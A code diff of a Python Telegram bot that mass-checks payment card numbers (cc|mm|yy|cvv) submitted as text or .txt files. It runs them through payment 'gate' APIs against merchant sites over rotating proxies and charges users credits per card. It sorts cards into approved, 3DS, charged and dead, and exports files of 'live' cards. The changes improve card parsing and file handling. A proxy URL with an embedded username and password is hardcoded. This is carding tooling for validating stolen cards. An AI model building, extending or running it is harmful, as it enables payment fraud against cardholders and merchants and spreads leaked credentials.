@@ -25,9 +25,12 @@ GATE_CONFIG = {
 
 def load_list_from_file(filename: str, default_list: list) -> list:
     if os.path.exists(filename):
-        with open(filename, 'r', encoding='utf-8') as f:
-            items = [line.strip() for line in f if line.strip()]
-            if items: return items
+        try:
+            with open(filename, 'r', encoding='utf-8') as f:
+                items = [line.strip() for line in f if line.strip()]
+                if items: return items
+        except:
+            pass
     return default_list
 
 PROXIES = load_list_from_file("proxies.txt", ["http://purevpn0s12153504:1LTpwxbCJbEdXo@px041202.pointtoserver.com:10780"])
@@ -35,11 +38,38 @@ SITES = load_list_from_file("sites.txt", ["https://powerbuild.store"])
 
 def parse_cards(text: str) -> list:
     cards = []
-    pattern = r'\b(\d{13,19})\s*[^a-zA-Z0-9\n]?\s*(\d{1,2})\s*[^a-zA-Z0-9\n]?\s*(\d{2,4})\s*[^a-zA-Z0-9\n]?\s*(\d{3,4})\b|\b(\d{13,19})\b'
-    matches = re.findall(pattern, text)
-    for match in matches:
-        if match[0]: cards.append(f"{match[0]}|{match[1]}|{match[2]}|{match[3]}")
-        elif match[4]: cards.append(match[4])
+    # Split by newlines, pipes, semicolons, commas
+    for sep in ['\n', '|', ';', ',']:
+        text = text.replace(sep, '\n')
+    
+    lines = text.split('\n')
+    for line in lines:
+        line = line.strip()
+        if not line:
+            continue
+            
+        # Check if it's in format cc|mm|yy|cvv or cc|mm|yyyy|cvv
+        parts = line.split('|')
+        if len(parts) >= 4:
+            # Try to combine if split incorrectly
+            card_part = parts[0].strip()
+            # Check if it's a valid card number (at least 13 digits)
+            if re.search(r'\d{13,19}', card_part):
+                cards.append(line)
+            continue
+        
+        # Try to find card pattern in the line
+        # Pattern: 13-19 digits optionally followed by |mm|yy|cvv
+        match = re.search(r'(\d{13,19})\s*[|,;]\s*(\d{1,2})\s*[|,;]\s*(\d{2,4})\s*[|,;]\s*(\d{3,4})', line)
+        if match:
+            cards.append(f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}")
+            continue
+        
+        # Just card number without expiry
+        match = re.search(r'(\d{13,19})', line)
+        if match:
+            cards.append(match.group(1))
+    
     return cards
 
 async def _download_file_cards(bot, file_id: str) -> str | None:
@@ -47,8 +77,10 @@ async def _download_file_cards(bot, file_id: str) -> str | None:
         file = await bot.get_file(file_id)
         content = await file.download_as_bytearray()
         if content:
-            try: return content.decode("utf-8", errors="ignore")
-            except: return content.decode("latin-1", errors="ignore")
+            try: 
+                return content.decode("utf-8", errors="ignore")
+            except: 
+                return content.decode("latin-1", errors="ignore")
         return None
     except Exception as e:
         print(f"Download error: {e}")
@@ -57,34 +89,47 @@ async def _download_file_cards(bot, file_id: str) -> str | None:
 async def extract_cards_from_update(update: Update, bot) -> list | None:
     msg = update.message
     
-    # 1. Direct text after command
+    # 1. Direct text after command (args)
     if update.args:
         cards = parse_cards(" ".join(update.args))
-        if cards: return cards
+        if cards: 
+            return cards
     
-    # 2. Reply to message (text or file)
+    # 2. Check if there's a file attached
+    if msg.document and msg.document.file_id:
+        # Download and parse the file content
+        content = await _download_file_cards(bot, msg.document.file_id)
+        if content:
+            cards = parse_cards(content)
+            if cards: 
+                return cards
+    
+    # 3. Reply to a message (text or file)
     if msg.reply_to_message:
         replied = msg.reply_to_message
+        
+        # Reply to text message
         if replied.text and replied.text.strip():
+            # Check if it's a file name or just text with cards
             cards = parse_cards(replied.text)
-            if cards: return cards
+            if cards: 
+                return cards
+        
+        # Reply to file document
         if replied.document and replied.document.file_id:
             content = await _download_file_cards(bot, replied.document.file_id)
             if content:
                 cards = parse_cards(content)
-                if cards: return cards
-
-    # 3. Direct file sent (user sent file with command as caption)
-    if msg.document and msg.document.file_id:
-        content = await _download_file_cards(bot, msg.document.file_id)
-        if content:
-            cards = parse_cards(content)
-            if cards: return cards
-
-    # 4. Message text (if command was in message without args)
-    if msg.text and msg.text.strip() and not msg.text.startswith('/'):
-        cards = parse_cards(msg.text)
-        if cards: return cards
+                if cards: 
+                    return cards
+    
+    # 4. Message text (if user typed cards directly)
+    if msg.text and msg.text.strip():
+        # If it's a command, skip (already handled by args)
+        if not msg.text.startswith('/'):
+            cards = parse_cards(msg.text)
+            if cards: 
+                return cards
 
     return None
 
@@ -131,17 +176,24 @@ async def check_single_card(session, gate_key, api_url, site, card, proxy, semap
                 async with session.get(api_url, params=params) as resp:
                     data = await resp.json(content_type=None)
             
-            if not isinstance(data, dict): data = {"Response": str(data), "Status": "false"}
+            if not isinstance(data, dict): 
+                data = {"Response": str(data), "Status": "false"}
             
             response_text = str(data.get("Response") or data.get("response") or data.get("message") or "ERROR").strip()
             status = str(data.get("Status") or data.get("status") or "false").lower()
             
-            if status == "true" or "approved" in response_text.lower(): card_status = "approved"
-            elif "3ds" in response_text.lower() or "3d secure" in response_text.lower(): card_status = "3ds"
-            elif "charged" in response_text.lower() or "captured" in response_text.lower(): card_status = "charged"
-            else: card_status = "dead"
+            if status == "true" or "approved" in response_text.lower(): 
+                card_status = "approved"
+            elif "3ds" in response_text.lower() or "3d secure" in response_text.lower(): 
+                card_status = "3ds"
+            elif "charged" in response_text.lower() or "captured" in response_text.lower(): 
+                card_status = "charged"
+            else: 
+                card_status = "dead"
             
             return {"card": card, "response": response_text, "status": status, "card_status": card_status, "error": None}
+        except asyncio.TimeoutError:
+            return {"card": card, "error": "TIMEOUT", "response": "TIMEOUT", "status": "false", "card_status": "dead"}
         except Exception as e:
             return {"card": card, "error": str(e)[:80], "response": "ERROR", "status": "false", "card_status": "dead"}
 
@@ -153,21 +205,29 @@ async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_
     use_proxy = cfg["use_proxy"]
     
     if not context.bot_data.get(f"{gate_key}_on", True):
-        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML"); return
+        await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML")
+        return
         
     cards = await extract_cards_from_update(update, context.bot)
     if not cards:
         await update.message.reply_text(
-            f"⚠️ Uꜱᴀɢᴇ:\n• <code>/{gate_key} cc|mm|yy|cvv</code>\n• Reply to a .txt file with /{gate_key}\n• Send a .txt file with /{gate_key} as caption", 
+            f"⚠️ Uꜱᴀɢᴇ:\n\n"
+            f"1️⃣ Send a .txt file with <code>/{gate_key}</code> as caption\n"
+            f"2️⃣ Reply to a .txt file with <code>/{gate_key}</code>\n"
+            f"3️⃣ Use: <code>/{gate_key} cc|mm|yy|cvv</code>\n\n"
+            f"Example: <code>/{gate_key} 4111111111111111|12|2026|123</code>", 
             parse_mode="HTML"
-        ); return
+        )
+        return
         
     if len(cards) > MAX_CARDS:
-        await update.message.reply_text(f"⚠️ Mᴀx {MAX_CARDS} ᴄᴀʀᴅꜱ ᴘᴇʀ ʀᴜɴ. Yᴏᴜ ꜱᴇɴᴛ: {len(cards)}", parse_mode="HTML"); return
+        await update.message.reply_text(f"⚠️ Mᴀx {MAX_CARDS} ᴄᴀʀᴅꜱ ᴘᴇʀ ʀᴜɴ. Yᴏᴜ ꜱᴇɴᴛ: {len(cards)}", parse_mode="HTML")
+        return
 
     if not await deduct_credits(context, update.effective_user.id, len(cards)):
         user_data = context.bot_data.get("user_data", {}).get(str(update.effective_user.id), {})
-        await update.message.reply_text(f"❌ Nᴇᴇᴅ {len(cards)} ᴄʀᴇᴅɪᴛꜱ, ʜᴀᴠᴇ {user_data.get('credits', 0)}.", parse_mode="HTML"); return
+        await update.message.reply_text(f"❌ Nᴇᴇᴅ {len(cards)} ᴄʀᴇᴅɪᴛꜱ, ʜᴀᴠᴇ {user_data.get('credits', 0)}.", parse_mode="HTML")
+        return
 
     rotator = ProxyRotator(PROXIES)
     dynamic_sites = SITES if SITES else ["https://powerbuild.store"]
@@ -224,12 +284,12 @@ async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_
     ]
     await msg.edit_text("\n".join(lines), parse_mode="HTML", reply_markup=create_result_buttons())
 
-async def cmd_au(u, c): await process_mass(u, c, "au")
-async def cmd_mss(u, c): await process_mass(u, c, "mss")
-async def cmd_mpp2(u, c): await process_mass(u, c, "mpp2")
-async def cmd_msh(u, c): await process_mass(u, c, "msh")
-async def cmd_mchk(u, c): await process_mass(u, c, "mchk")
-async def cmd_mpp(u, c): await process_mass(u, c, "mpp")
+async def cmd_au(update, context): await process_mass(update, context, "au")
+async def cmd_mss(update, context): await process_mass(update, context, "mss")
+async def cmd_mpp2(update, context): await process_mass(update, context, "mpp2")
+async def cmd_msh(update, context): await process_mass(update, context, "msh")
+async def cmd_mchk(update, context): await process_mass(update, context, "mchk")
+async def cmd_mpp(update, context): await process_mass(update, context, "mpp")
 
 async def mass_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -240,10 +300,12 @@ async def mass_callback_handler(update: Update, context: ContextTypes.DEFAULT_TY
     for prefix in GATE_CONFIG.keys():
         key = f"{prefix}_results_{user_id}"
         if key in context.bot_data:
-            data_key = key; break
+            data_key = key
+            break
             
     if not data_key:
-        await query.answer("Results expired. Please run the command again.", show_alert=True); return
+        await query.answer("Results expired. Please run the command again.", show_alert=True)
+        return
         
     results = context.bot_data[data_key]
     data = query.data
@@ -253,15 +315,18 @@ async def mass_callback_handler(update: Update, context: ContextTypes.DEFAULT_TY
     if data == "result_live":
         file_name = f"live_cards_{user_id}.txt"
         file_content = "\n".join([r["card"] for r in results.get("approved", [])])
-        if not file_content: file_content = "No approved (live) cards found."
+        if not file_content: 
+            file_content = "No approved (live) cards found."
     elif data == "result_3ds":
         file_name = f"3ds_cards_{user_id}.txt"
         file_content = "\n".join([r["card"] for r in results.get("threeds", [])])
-        if not file_content: file_content = "No 3DS cards found."
+        if not file_content: 
+            file_content = "No 3DS cards found."
     elif data == "result_charge":
         file_name = f"charged_cards_{user_id}.txt"
         file_content = "\n".join([r["card"] for r in results.get("charged", [])])
-        if not file_content: file_content = "No charged cards found."
+        if not file_content: 
+            file_content = "No charged cards found."
     elif data == "result_all":
         file_name = f"all_results_{user_id}.txt"
         lines = []
@@ -271,7 +336,8 @@ async def mass_callback_handler(update: Update, context: ContextTypes.DEFAULT_TY
             resp = r.get("response", "N/A")
             lines.append(f"{card} - {status} - {resp}")
         file_content = "\n".join(lines)
-        if not file_content: file_content = "No cards processed."
+        if not file_content: 
+            file_content = "No cards processed."
         
     bio = BytesIO(file_content.encode('utf-8'))
     bio.name = file_name
